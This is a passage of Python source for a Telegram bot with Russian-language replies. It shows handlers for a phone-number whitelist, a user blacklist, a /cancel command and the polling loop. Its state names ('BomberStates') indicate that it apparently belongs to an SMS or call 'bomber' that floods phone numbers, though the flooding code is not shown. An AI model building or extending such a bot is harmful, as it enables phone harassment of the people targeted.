                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"ℹ️ Номер **{number}** не найден в белом списке!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:ADD_BLACKLIST":
            user_id_input = message.text.strip()
            try:
                if not user_id_input.isdigit():
                    bot.reply_to(
                        message,
                        "❌ ID должен содержать только цифры!\n"
                        "Пример: 6457569474\n"
                        "Попробуй ещё раз:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                blacklist = load_blacklist()
                if user_id_input not in blacklist:
                    blacklist.append(user_id_input)
                    save_blacklist(blacklist)
                    bot.reply_to(
                        message,
                        f"✅ Пользователь **{user_id_input}** добавлен в черный список.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"ℹ️ Пользователь **{user_id_input}** уже в черном списке!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:REMOVE_BLACKLIST":
            user_id_input = message.text.strip()
            try:
                if not user_id_input.isdigit():
                    bot.reply_to(
                        message,
                        "❌ ID должен содержать только цифры!\n"
                        "Пример:   148866688\n"
                        "Попробуй ещё раз:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                blacklist = load_blacklist()
                if user_id_input in blacklist:
                    blacklist.remove(user_id_input)
                    save_blacklist(blacklist)
                    bot.reply_to(
                        message,
                        f"✅ Пользователь **{user_id_input}** удалён из черного списка.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"ℹ️ Пользователь **{user_id_input}** не найден в черном списке!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ Ошибка: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        else:
            bot.reply_to(
                message,
                "ℹ️ Пожалуйста, используй кнопки ниже:",
                reply_markup=markup,
                parse_mode='Markdown'
            )

@bot.message_handler(commands=['cancel'])
def cancel(message):
    logger.info(f"Received /cancel from user {message.from_user.id}")
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    bot.reply_to(
        message,
        "✅ Действие отменено.\n"
        "Выбери, что хочешь сделать:",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.delete_state(message.from_user.id, message.chat.id)

if __name__ == '__main__':
    logger.info("Starting bot polling")
    init_storage()
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            logger.error(f"Polling error: {str(e)}")
            time.sleep(5)